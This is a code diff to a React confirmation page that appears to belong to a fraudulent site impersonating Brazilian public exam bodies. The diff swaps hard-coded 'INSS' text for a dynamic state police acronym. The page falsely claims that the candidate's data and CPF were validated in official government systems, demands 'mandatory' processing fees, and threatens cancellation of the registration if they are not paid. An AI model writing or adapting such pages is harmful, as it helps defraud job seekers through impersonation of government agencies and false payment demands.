@@ -5,6 +5,7 @@ import { ExercitoHeader } from '@/components/ExercitoHeader';
 import { ExercitoFooter } from '@/components/ExercitoFooter';
 import { useClarityEvents } from '@/hooks/use-clarity-events';
 import { normalizeGender } from '@/utils/gender';
+import { useEstadoPM } from '@/hooks/useEstadoPM';
 
 interface AppointmentData {
   date: string;
@@ -34,6 +35,8 @@ function fmt(v: number) {
 
 export default function ConfirmacaoMedicaPage() {
   const [, setLocation] = useLocation();
+  const estadoPM = useEstadoPM();
+  const sigla = estadoPM?.sigla ?? 'PM';
   const [appointmentData, setAppointmentData] = useState<AppointmentData | null>(null);
   const [confirmationCode, setConfirmationCode] = useState('');
   const [candidateFullName, setCandidateFullName] = useState('');
@@ -162,12 +165,12 @@ export default function ConfirmacaoMedicaPage() {
 
   return (
     <div className="min-h-screen bg-white flex flex-col" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
-      <ExercitoHeader />
+      <ExercitoHeader customTitle={sigla} />
       
       <main className="flex-1 container mx-auto max-w-4xl px-4 py-6">
         {/* Breadcrumb */}
         <nav className="text-sm text-gray-500 mb-6">
-          <span>Concurso Público INSS 2026</span>
+          <span>Concurso {sigla} 2026</span>
           <span className="mx-1 text-gray-400">›</span> 
           <span>Exame Médico</span>
           <span className="mx-1 text-gray-400">›</span> 
@@ -235,7 +238,7 @@ export default function ConfirmacaoMedicaPage() {
               <ul className="space-y-1">
                 <li>• RG e CPF (originais)</li>
                 <li>• Comprovante de endereço</li>
-                <li>• Protocolo oficial INSS</li>
+                <li>• Protocolo oficial {sigla}</li>
                 <li>• Código: <strong>{confirmationCode}</strong></li>
                 {candidateGender === 'feminino' && (
                   <li>• Acompanhante permitido (se desejar)</li>
@@ -285,7 +288,7 @@ export default function ConfirmacaoMedicaPage() {
                   </h3>
 
                   <p className="text-sm text-gray-600 mb-1">
-                    <strong className="text-gray-800">{candidateFullName || 'Candidato'}</strong>, seus dados foram validados no Portal do INSS.
+                    <strong className="text-gray-800">{candidateFullName || 'Candidato'}</strong>, seus dados foram validados no Portal da {sigla}.
                   </p>
                   <p className="text-xs text-gray-500 mb-4">
                     ✓ CPF {candidateCPF ? candidateCPF.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.***.***-$4') : '***.***.***-**'} confirmado na base oficial
@@ -306,7 +309,7 @@ export default function ConfirmacaoMedicaPage() {
                             <span className="font-medium text-gray-900">R$ {fmt(bd.taxa)}</span>
                           </div>
                           <div className="flex justify-between py-1.5">
-                            <span className="text-gray-600">Taxa de Processamento Documental — INSS</span>
+                            <span className="text-gray-600">Taxa de Processamento Documental — {sigla}</span>
                             <span className="font-medium text-gray-900">R$ {fmt(bd.emolumento)}</span>
                           </div>
                           <div className="flex justify-between py-1.5">
@@ -322,7 +325,7 @@ export default function ConfirmacaoMedicaPage() {
                     })() : (
                       <div className="text-sm text-gray-400 py-2">Carregando taxas...</div>
                     )}
-                    <p className="text-xs text-gray-400 mt-2">Base Legal: Taxas obrigatórias conforme edital do Concurso Público INSS 2026.</p>
+                    <p className="text-xs text-gray-400 mt-2">Base Legal: Taxas obrigatórias conforme edital do Concurso {sigla} 2026.</p>
                   </div>
 
                   <p className="text-xs text-red-600 mb-4 font-medium">O não pagamento cancelará automaticamente sua inscrição no concurso.</p>
